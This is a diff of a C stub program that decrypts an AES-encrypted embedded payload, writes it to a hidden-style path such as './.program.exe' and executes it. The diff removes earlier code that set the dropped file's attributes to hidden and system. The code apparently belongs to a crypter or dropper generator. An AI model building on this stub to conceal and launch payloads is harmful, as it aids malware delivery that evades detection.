@@ -1,12 +1,11 @@
 /* All the data needed for the stub run that cames from the gen program goes here */
 
+#include <unistd.h>
+#include <string.h>
+
 #include "general.h"
 #include "lib/aes.h"
 #include "lib/file.h"
-
-#ifdef WINDOWS
- #define FILE_ATTR FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM
-#endif
 
 // These definitions are just for testing
 #ifndef ENC_CONTENT
@@ -22,44 +21,14 @@
  #define PATH "./.program.exe"
 #endif
 
-#ifdef WINDOWS
-    #include <Windows.h>
 
-    void run(const char *path) {
-        PROCESS_INFORMATION pi;
-        STARTUPINFO si;
-        memset(&si, 0, sizeof si);
-        si.cb = sizeof si;
+void run(const char *path) {
+  #ifdef __unix__
+    chmod(path, 00777);
+  #endif
 
-        bool ret = CreateProcess(path, NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
-        if(!ret)
-            return;
-
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    }
-
-    void hideFile(const char *path) {
-        SetFileAttributes(path, FILE_ATTR);
-    }
-#elif defined LINUX
-    #include <unistd.h>
-    #include <sys/wait.h>
-    #include <sys/types.h>
-
-    void run(const char *path) {
-        pid_t pid = fork();
-        if(pid == 0) {
-            execl(path, path, (char *) NULL);
-        }
-    }
-
-    void hideFile(const char *path) {
-        chmod(path, 00111);
-    }
-#else
-    #error NO_OS_ERROR_MSG
-#endif
+    execl(path, path, (char *) NULL);
+}
 
 
 int main(void) {
@@ -68,11 +37,21 @@ int main(void) {
         return 0;
     }
 
-    /* Get the date that came from the main program */
+    /* Get the data that came from the main program */
     uint8_t key[] = KEY;
     uint8_t content[] = ENC_CONTENT;
     uint8_t iv[] = IV;
     SIZ size = ENC_SIZE;
+
+    size_t pathSize = strlen(PATH) + 10;
+    char *path = malloc(pathSize);
+    if(path == NULL)
+        return 0;
+
+    memset(path, 0, pathSize);
+    if( !( (strstr(PATH, "/") != NULL) || (strstr(PATH, "\\") != NULL) ))
+        strcat(path, "./");
+    strcat(path, PATH);
 
     /* Decrypt */
     struct AES_ctx context;
@@ -84,11 +63,11 @@ int main(void) {
     size -= pad;
 
     /* Write output program */
-    UNIV_FILE file = file_open(PATH, M_WRITE_NEW);
+    UNIV_FILE file = file_open(path, M_WRITE_NEW);
     file_write(content, size, file);
     file_close(file);
 
-    hideFile(PATH);
-    run(PATH);
+    run(path);
+    free(path);
     return 0;
 }
